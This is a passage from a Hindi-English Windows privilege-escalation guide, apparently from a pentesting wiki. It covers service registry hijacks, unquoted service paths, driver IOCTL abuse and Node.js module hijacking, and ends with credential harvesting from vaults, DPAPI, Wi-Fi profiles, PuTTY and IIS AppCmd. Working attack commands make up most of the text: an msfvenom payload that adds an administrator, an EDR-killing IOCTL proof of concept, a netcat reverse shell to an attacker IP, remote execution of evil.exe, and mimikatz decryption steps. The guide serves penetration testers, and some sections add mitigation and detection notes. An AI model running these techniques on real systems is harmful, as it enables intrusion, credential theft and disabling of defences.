4. SYSTEM attacker-chosen value को redirected HKLM path पर write करता है।

एक बार arbitrary HKLM value write मिल जाए, तो service configuration values overwrite करके LPE की तरफ pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे normal user start कर सके (e.g., **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में **locks the workstation** करती है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**. Windows services के मामले में, यह **arbitrary code execute करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows हर space से पहले वाले ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows यह execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths की सूची बनाएं, built-in Windows services से संबंधित को छोड़कर:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability को detect और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप metasploit के साथ manually एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows users को यह specify करने की अनुमति देता है कि यदि कोई service fail हो जाए तो कौन-सी actions ली जाएँ। इस feature को एक binary की ओर point करने के लिए configure किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकती है। अधिक details [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती हैं।

## Applications

### Installed Applications

**binaries** की permissions (शायद आप किसी एक को overwrite करके privileges escalate कर सकते हैं) और **folders** ([DLL Hijacking](dll-hijacking/index.html)) की जांच करें।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जांचें कि क्या आप किसी config file को modify करके किसी special file को read कर सकते हैं, या क्या आप किसी binary को modify कर सकते हैं जिसे Administrator account द्वारा execute किया जाने वाला है (schedtasks).

system में weak folder/files permissions ढूंढने का एक तरीका यह है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders के तहत किसी भी plugin DLL को autoload करता है। अगर कोई writable portable/copy install मौजूद है, तो malicious plugin drop करने से हर launch पर `notepad++.exe` के अंदर automatic code execution मिलता है (जिसमें `DllMain` और plugin callbacks से भी execution शामिल है)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Possible **third party weird/vulnerable** drivers खोजें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.

This creates two useful primitives:

- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.

Practical exploitation notes:

- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte `int` में 8-byte direct write adjacent stack data को corrupt करता है और पास के callback/function pointer को partially overwrite कर सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode `EntryContext` से `UNICODE_STRING` point करने की उम्मीद करता है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए reuse करता है, तो attacker `Length`/`MaximumLength` को control करता है और `Buffer` pointer को आंशिक रूप से influence करता है, जिससे semi-controlled kernel write मिलता है।
- **`REG_BINARY`**: बड़े binary data के लिए direct mode `EntryContext` पर मौजूद पहले `LONG` को signed buffer size की तरह treat करता है। अगर पहले का `REG_DWORD` read reused scalar में attacker-controlled **negative** value छोड़ देता है, तो अगला `REG_BINARY` query attacker bytes को सीधे adjacent stack slots पर copy करता है, जो अक्सर full callback-pointer overwrite तक पहुँचने का सबसे साफ़ रास्ता होता है।

Strong hunting pattern: **same stack variable में बिना reinitializing किए heterogeneous registry reads**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, और वे code paths grep करें जहाँ पहला registry read तय करता है कि दूसरा read होगा या नहीं।

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object strong SDDL के साथ IoCreateDeviceSecure से बनाते हैं, लेकिन `DeviceCharacteristics` में `FILE_DEVICE_SECURE_OPEN` set करना भूल जाते हैं। इस flag के बिना, extra component वाले path से device open करने पर secure DACL enforce नहीं होती, जिससे कोई भी unprivileged user namespace path जैसे:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

का उपयोग करके handle प्राप्त कर सकता है।

एक बार user device open कर ले, तो driver द्वारा exposed privileged IOCTLs को LPE और tampering के लिए abuse किया जा सकता है। Wild में देखी गई example capabilities:
- Arbitrary processes के लिए full-access handles return करना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary processes terminate करना, including Protected Process/Light (PP/PPL), जिससे kernel via user land से AV/EDR kill संभव होता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए mitigations
- जब DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाएं, हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को constrain करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

defenders के लिए detection ideas
- संदिग्ध device names (जैसे \\ .\\amsdk*) के user-mode opens और abuse का संकेत देने वाले specific IOCTL sequences को monitor करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी own allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास PATH में मौजूद किसी folder के अंदर **write permissions** हैं, तो आप किसी process द्वारा loaded DLL को hijack करके **privileges escalate** कर सकते हैं।

PATH के अंदर मौजूद सभी folders की permissions check करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
अधिक जानकारी के लिए कि इस check का abuse कैसे करें:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

यह **Windows uncontrolled search path** का एक variant है जो **Node.js** और **Electron** applications को प्रभावित करता है जब वे bare import जैसे `require("foo")` करते हैं और अपेक्षित module **missing** होता है।

Node directory tree में ऊपर की ओर जाकर और हर parent पर `node_modules` folders check करके packages resolve करता है। Windows पर, यह walk drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application अंततः इन paths को probe कर सकता है:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **low-privileged user** `C:\node_modules` create कर सकता है, तो वह एक malicious `foo.js` (या package folder) रख सकता है और किसी **higher-privileged Node/Electron process** के missing dependency resolve करने का इंतजार कर सकता है। Payload victim process के security context में execute होता है, इसलिए यह **LPE** बन जाता है जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app से चलता है।

यह खास तौर पर आम है जब:

- एक dependency `optionalDependencies` में declared हो
- कोई third-party library `require("foo")` को `try/catch` में wrap करे और failure पर आगे continue करे
- कोई package production builds से removed हो, packaging के दौरान omitted हो, या install होने में fail हो गया हो
- vulnerable `require()` main application code की बजाय dependency tree के deep अंदर मौजूद हो

### Vulnerable targets hunting

Resolution path prove करने के लिए **Procmon** use करें:

- `Process Name` = target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` `contains` `node_modules` पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के तहत अंतिम successful open पर focus करें

Unpacked `.asar` files या application sources में useful code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon या source review से **missing package name** की पहचान करें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएं:
```powershell
mkdir C:\node_modules
```
3. सही expected name वाला एक module drop करें:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. पीड़ित application को trigger करें। यदि application `require("foo")` का प्रयास करती है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस pattern में fit होने वाले missing optional modules के real-world examples `bluebird` और `utf-8-validate` include करते हैं, लेकिन **technique** reusable हिस्सा है: कोई भी **missing bare import** खोजें जिसे एक privileged Windows Node/Electron process resolve करेगा।

### Detection and hardening ideas

- जब कोई user `C:\node_modules` बनाता है या वहाँ नई `.js` files/packages लिखता है, तो alert करें।
- High-integrity processes को `C:\node_modules\*` से पढ़ते हुए hunt करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` usage audit करें।
- Third-party code में silent `try { require("...") } catch {}` patterns की review करें।
- Optional probes को disable करें जब library इसे support करती हो (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य known computers की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुली पोर्ट्स

बाहर से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### Routing Table
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP टेबल
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित commands के लिए इस पेज को देखें**](../basic-cmd-for-pentesters.md#firewall) **(rules सूचीबद्ध करें, rules बनाएं, बंद करें, बंद करें...)**

नेटवर्क enumeration के लिए और[ commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

अगर आपको root user मिल जाए तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का use करेंगे, तो यह GUI के जरिए पूछेगा कि क्या firewall द्वारा `nc` को allow किया जाना चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वर, वेबसाइटों और अन्य programs के लिए user credentials store करता है, ताकि **Windows** users को automatically **log in** करा सके. पहली नज़र में, ऐसा लग सकता है कि अब users अपने Facebook credentials, Twitter credentials, Gmail credentials आदि store कर सकते हैं, ताकि वे browsers के जरिए automatically log in हो जाएँ. लेकिन ऐसा नहीं है.

Windows Vault उन credentials को store करता है जिनसे Windows users को automatically log in करा सकता है, जिसका मतलब है कि कोई भी **Windows application जिसे किसी resource** (server या website) तक access करने के लिए credentials चाहिए **वह इस Credential Manager** और Windows Vault का use कर सकती है और users के बार-बार username और password enter करने के बजाय दिए गए credentials use कर सकती है.

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी given resource के credentials use कर सकती हैं. इसलिए, अगर आपकी application vault का use करना चाहती है, तो उसे somehow **credential manager से communicate करना होगा और default storage vault से उस resource के credentials request करने होंगे**.

Machine पर stored credentials list करने के लिए `cmdkey` का use करें.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप saved credentials का उपयोग करने के लिए `runas` को `/savecred` options के साथ इस्तेमाल कर सकते हैं। निम्नलिखित example एक SMB share के जरिए remote binary को call कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` का उपयोग प्रदान किए गए credentials के सेट के साथ करें।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक method प्रदान करता है, जिसका उपयोग मुख्यतः Windows operating system में asymmetric private keys के symmetric encryption के लिए किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का leverage करता है।

**DPAPI, user के login secrets से derived symmetric key के माध्यम से keys के encryption को सक्षम बनाता है**। system encryption से जुड़े scenarios में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में stored होती हैं, जहाँ `{SID}` user का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो master key के साथ co-located होती है और उसी file में user की private keys की सुरक्षा करती है**, आमतौर पर 64 bytes के random data से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस directory तक access restricted है, इसलिए CMD में `dir` command के जरिए इसके contents को list नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से list किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password** द्वारा protected **credentials files** आमतौर पर यहाँ स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक तरीके से store करने के लिए किया जाता है। ये credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका आमतौर पर मतलब है कि इन्हें केवल उसी user और उसी computer पर decrypt किया जा सकता है जिस पर वे created हुए थे।

किसी file में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP Connections

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### हाल ही में चलाए गए Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **passwords** और अन्य जानकारी **save** करने के लिए करते हैं, यह समझे बिना कि यह एक database file है। यह file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में स्थित होती है और इसे हमेशा search और examine करना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में located है।\
यदि यह file मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recovered** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से extract किया गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं .\
इंस्टॉलर **SYSTEM privileges** के साथ **run** होते हैं, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** के लिए vulnerable हैं
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर store किया जा सकता है, इसलिए आपको check करना चाहिए कि उसमें कुछ interesting है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में stored होती है, लेकिन [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके इसे आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service running नहीं है और आप चाहते हैं कि यह boot पर automatically start हो, तो run करें:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब valid नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` के साथ add करने और ssh के जरिए एक machine में login करने की कोशिश की। registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के use की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
